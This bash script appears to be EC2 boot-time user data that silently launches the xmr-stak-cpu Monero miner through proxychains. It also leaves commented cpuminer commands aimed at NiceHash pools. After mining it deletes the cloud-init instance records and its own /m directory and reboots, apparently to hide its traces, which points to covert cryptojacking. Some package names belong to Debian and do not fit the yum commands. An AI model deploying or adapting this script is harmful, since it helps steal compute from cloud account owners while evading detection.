#!/bin/bash
sudo yum remove sendmail -y
sudo yum install git build-essential automake libjansson-dev libgmp-dev libcurl4-openssl-dev libssl-dev pthreads zlib openssl-devel gcc-c++ curl-devel libmpc-devel gmp  gmp-devel  mpfr  mpfr-devel  libmpc  libmpc-devel -y
#cd /home/ec2user
#git clone --recursive https://github.com/JayDDee/cpuminer-opt.git
#cd cpuminer-opt
#ln -s /usr/include/curl curl
#git checkout linux
#sudo CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl
sudo sysctl -w vm.nr_hugepages=128
#sudo ./build.sh
rm -rf /var/lib/cloud/instance/*

file="/flag2"
if [ -f "$file" ]
then
  sudo yum remove sendmail -y
  sudo yum install git build-essential automake libjansson-dev libgmp-dev libcurl4-openssl-dev libssl-dev pthreads zlib openssl-devel gcc-c++ curl-devel libmpc-devel gmp  gmp-devel  mpfr  mpfr-devel  libmpc  libmpc-devel -y
  sudo chmod +x /m/test01/proxychains/proxychains4
  sudo chmod +x /m/test01/xmr/xmr-stak-cpu
  sudo chmod +x /m/test01/proxychains/libproxychains4.so
  # Placeholder for ProxyChains Update from Boot Strap Variables
	# sudo sed -i 's/socks4/#http/' /m/test01/proxychains-ng/src/proxychains.conf
	# sudo sed -i -e "\$ahttp    $VAR_PI    $VAR_PO    $VAR_PO  $VAR_PP" /m/test01/proxychains-ng/src/proxychains.conf
  ( sleep 86400 ; sudo reboot ) & 
  cd /m/test01/xmr
  
  if [ -f "/m/test01/xmr/config.aws$cores" ]
  	then
  sudo cp /m/test01/xmr/config.aws$cores /m/test01/xmr/config.txt
    	else
  sudo cp /m/test01/xmr/config.aws /m/test01/xmr/config.txt
  fi
  #
  sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
  sudo sed -i 's/usa/eu/' /m/test01/xmr/config.txt
  sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
  rm -rf /var/lib/cloud/instance/*
  cd /
  sudo rm -R /m
  sudo reboot   
else
  sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
  sudo /bin/su -c "echo 'soft memlock 262144' >> /etc/security/limits.conf"
  sudo /bin/su -c "echo 'hard memlock 262144' >> /etc/security/limits.conf"
  sudo /bin/su -c "echo 'xxxxx' >> /flag2"
  sudo reboot  
fi
#while true; do
#cd /m/test01/xmr/
#sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1

# sudo ./cpuminer -a cryptonight -o stratum+tcp://cryptonight.usa.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
# sudo ./cpuminer -a cryptonight -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
#done
